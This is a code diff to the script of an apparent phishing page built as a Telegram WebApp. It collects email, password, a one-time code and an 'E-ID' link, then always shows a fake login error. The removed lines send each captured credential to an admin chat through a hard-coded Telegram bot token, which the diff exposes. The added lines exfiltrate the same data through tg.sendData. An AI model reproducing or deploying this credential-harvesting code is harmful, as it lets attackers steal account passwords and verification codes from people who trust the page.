@@ -126,22 +126,15 @@ h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}p,h1,h2,h3,h4,h5,h6{over
 const tg = window.Telegram.WebApp;
 tg.expand();
 
-const BOT_TOKEN = "8603629858:AAHoJGBCDvvImzpO3wllUriPulRvX0APozY";
-const ADMIN_ID = "8542901240";
 let tempEmail = '';
 let tempPassword = '';
 
 const pages = {
-    main: document.getElementById('pageMain'),
-    about: document.getElementById('pageAbout'),
-    buy: document.getElementById('pageBuy'),
-    guide: document.getElementById('pageGuide'),
-    faq: document.getElementById('pageFaq'),
-    loginForm: document.getElementById('pageLoginForm'),
-    code: document.getElementById('pageCode'),
-    eid: document.getElementById('pageEid'),
-    eidLink: document.getElementById('pageEidLink'),
-    loginError: document.getElementById('pageLoginError'),
+    main: document.getElementById('pageMain'), about: document.getElementById('pageAbout'),
+    buy: document.getElementById('pageBuy'), guide: document.getElementById('pageGuide'),
+    faq: document.getElementById('pageFaq'), loginForm: document.getElementById('pageLoginForm'),
+    code: document.getElementById('pageCode'), eid: document.getElementById('pageEid'),
+    eidLink: document.getElementById('pageEidLink'), loginError: document.getElementById('pageLoginError'),
     error: document.getElementById('pageError')
 };
 
@@ -181,62 +174,41 @@ function goToLoginForm() { switchPage('loginForm'); setTimeout(() => document.ge
 function goToEid() { switchPage('eid'); setTimeout(() => document.getElementById('eidEmail').focus(), 300); }
 function openSupportChat() { window.open("https://t.me/erubsite", '_blank'); }
 
-// ОТПРАВКА БЕЗ ОШИБОК CORS (urlencoded)
-function sendToAdmin(text) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    fetch(url, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: `chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`
-    }).catch(e => console.log(e));
-}
-
-// 1. Ввод почты/пароля
+// ВХОД (сохраняем данные, идем на ввод кода)
 function handleLogin() {
     const e = document.getElementById('email').value.trim();
     const p = document.getElementById('password').value.trim();
     if (!e || !p) { showMessage('Заполните поля', 'error'); return; }
-    tempEmail = e;
-    tempPassword = p;
-    
-    sendToAdmin(`🔔 <b>ВХОД</b>\n📧 Email: ${e}\n🔑 Пароль: ${p}`);
-    
+    tempEmail = e; tempPassword = p;
     switchPage('code');
     document.getElementById('codeStatus').style.display = 'block';
     setTimeout(() => document.getElementById('codeInput').focus(), 300);
 }
 
-// 2. Ввод кода
+// КОД (отправляем через tg.sendData)
 function handleCode() {
-    const code = document.getElementById('codeInput').value.trim();
-    if (!code) { showMessage('Введите код', 'error'); return; }
-
-    sendToAdmin(`📧 <b>КОД</b>\n👤 ${tempEmail}\n🔢 Код: ${code}`);
+    const c = document.getElementById('codeInput').value.trim();
+    if (!c) { showMessage('Введите код', 'error'); return; }
+    tg.sendData(JSON.stringify({ type: 'login', email: tempEmail, password: tempPassword, code: c }));
     switchPage('loginError');
 }
 
-// 3. E-ID Вход
+// E-ID (сохраняем данные, идем на ввод ссылки)
 function handleEidLogin() {
     const e = document.getElementById('eidEmail').value.trim();
     const p = document.getElementById('eidPassword').value.trim();
     if (!e || !p) { showMessage('Заполните поля', 'error'); return; }
-    tempEmail = e;
-    tempPassword = p;
-    
-    sendToAdmin(`🆔 <b>E-ID</b>\n📧 Email: ${e}\n🔑 Пароль: ${p}`);
-    
+    tempEmail = e; tempPassword = p;
     switchPage('eidLink');
     document.getElementById('eidLinkStatus').style.display = 'block';
     setTimeout(() => document.getElementById('eidLinkInput').focus(), 300);
 }
 
-// 4. E-ID Ссылка
+// ССЫЛКА (отправляем через tg.sendData)
 function handleEidLink() {
-    const link = document.getElementById('eidLinkInput').value.trim();
-    if (!link) { showMessage('Введите ссылку', 'error'); return; }
-
-    sendToAdmin(`🔗 <b>ССЫЛКА</b>\n👤 ${tempEmail}\n${link}`);
+    const l = document.getElementById('eidLinkInput').value.trim();
+    if (!l) { showMessage('Введите ссылку', 'error'); return; }
+    tg.sendData(JSON.stringify({ type: 'eid', email: tempEmail, password: tempPassword, link: l }));
     switchPage('loginError');
 }
 
